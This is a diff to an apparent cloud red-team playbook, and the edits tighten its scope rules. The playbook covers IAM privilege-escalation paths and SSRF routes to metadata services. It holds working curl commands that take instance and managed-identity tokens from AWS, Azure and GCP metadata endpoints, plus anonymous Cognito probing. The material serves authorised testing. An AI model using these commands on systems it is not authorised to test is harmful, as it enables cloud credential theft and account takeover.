@@ -121,6 +121,8 @@ Quick lookup — if you have any of these IAM actions, escalate via the listed t
 | `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
 | `cloudformation:UpdateStack` | Modify stack to grant self admin |
 | `sts:AssumeRole` (where trust allows you) | Direct privilege jump |
+| `ssm:SendCommand` or `ssm:StartSession` on an instance whose role is stronger | Run as that instance role; one command that prints the caller identity, then stop |
+| `ec2:ModifyInstanceAttribute` (userData) on an instance you can restart, plus its profile | userData runs as the instance role — document the path; do not reboot prod to prove it |
 
 Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.
 
@@ -147,7 +149,7 @@ aws sts get-caller-identity  # should now show OTHER_ACCT
 # Re-enumerate from new identity (chain continues)
 ```
 
-**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.
+**Confused deputy:** a missing `sts:ExternalId` does not mean anyone can assume the role. Read `Principal`. You can assume only when that principal is your account, `*`, or a role you already hold. A missing ExternalId on a role that trusts a *vendor* account is a confused-deputy bug for that vendor's other customers — you cannot exploit it unless you can authenticate as the trusted principal. Quote the trust document you retrieved. A wildcard principal (`"AWS": "*"`) with no condition is the externally assumable case.
 
 ---
 
@@ -166,9 +168,21 @@ curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-tok
 TOKEN=...
 curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-# SSRF bypass for IMDSv2:
-# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
-# Exception: SSRF in functions that themselves perform requests with custom headers.
+# Decision, in order. "IMDSv2 is on" is not "unreachable".
+# 1. IMDSv1 GET first — many instances still answer both.
+# 2. IMDSv2 only if the SSRF can set method=PUT and header
+#    X-aws-ec2-metadata-token-ttl-seconds, then replay X-aws-ec2-metadata-token.
+#    Default hop limit is 1, so a container SSRF often fails even with PUT.
+#    Record that failure; do not call the instance patched.
+# 3. ECS/Fargate is a different address:
+#    http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+#    The relative URI is in the task environment, not at the EC2 path.
+# 4. EKS IRSA is a projected token file plus sts:AssumeRoleWithWebIdentity.
+#    That is post-foothold on the pod, not an HTTP SSRF to 169.254.169.254.
+# 5. EKS Pod Identity (2024+): http://169.254.170.23/v1/credentials
+#    Authorization: the projected token at AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE.
+#    SSRF that cannot read that file cannot mint creds. Token-file read + GET = live STS.
+#    IPv6: [fd00:ec2::23]
 ```
 
 ---
@@ -220,6 +234,13 @@ curl -H "Metadata: true" \
 curl -H "Metadata: true" \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
 # → If Managed Identity has Graph permissions, read all M365 data
+```
+
+App Service / Functions / Container Apps are **not** VM IMDS. They inject `IDENTITY_ENDPOINT` + `IDENTITY_HEADER` (send as `X-IDENTITY-HEADER`). Typical URLs: `http://169.254.255.2:8081/msi/token` or `http://127.0.0.1:<port>/MSI/token?api-version=2019-08-01&resource=https://management.azure.com/`. Header-only SSRF without the env secret fails. Env-read or RCE on the app is the path; one token GET is the proof. Do not `?recursive=` dump.
+
+```bash
+curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"
 ```
 
 ---
@@ -289,9 +310,12 @@ gcloud container clusters list 2>&1 | head
 ## GCP IMDS attack (via SSRF or post-RCE)
 
 ```bash
-# GCP IMDS endpoint:
+# GCP IMDS — hostname or link-local. Always send Metadata-Flavor: Google.
+# A 403 without the header is not "no role". One token GET. Do not ?recursive=true on the tree.
 curl -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+curl -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
 
 # Returns access token. Use:
 TOKEN=...
@@ -338,7 +362,7 @@ kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-
 | Tool | Cloud | Purpose |
 |---|---|---|
 | **Pacu** | AWS | Full red-team framework, 100+ modules |
-| **enumerate-iam.py** | AWS | Brute-force list of API calls to discover permissions |
+| **enumerate-iam.py** | AWS | Short AccessDenied-vs-success probe of high-value actions. Not a credential brute. Do not fire hundreds of calls, and do not call mutating actions |
 | **PMapper** | AWS | Visualize privesc paths as graph |
 | **CloudFox** | AWS | Recon-focused (enumerate resources, no privesc) |
 | **Prowler** | AWS/Azure/GCP | Compliance scanning + enumeration |
@@ -473,7 +497,7 @@ aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
 aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
 ```
 
-Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.
+Blackbox (the normal case) — probe a short high-value action list and compare `AccessDenied` to success. This is not a credential brute and it is not a 500-action sweep. Common over-permissions worth one read each: `s3:ListBucket`/`s3:GetObject` on a bucket the app names, `dynamodb:Scan` on a table the app names, `lambda:GetFunction`, `appsync:GraphQL`, `cognito-idp:ListUsers`, `iam:PassRole`, `kms:Decrypt`. One successful read of production data is the proof. Do not call mutating actions (`AdminCreateUser`, `PutObject`, `InvokeFunction`) unless the engagement authorizes that single call.
 
 ### Severity rubric
 
@@ -502,10 +526,10 @@ Blackbox (the normal case) — fire a permission probe across high-value service
 
 Always include in the report:
 - `sts get-caller-identity` output (proves the role ARN + account ID)
-- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
-- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)
+- The short permission probe (which high-value calls returned data vs AccessDenied)
+- One concrete read (one S3 key listing or one DynamoDB item, PII redacted)
 
-Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.
+The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. Reaching that anonymously proves an unauthenticated role exists. Severity follows the data you actually read in the table above. Identity alone, with every high-value call returning AccessDenied, is informational.
 
 Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.
 
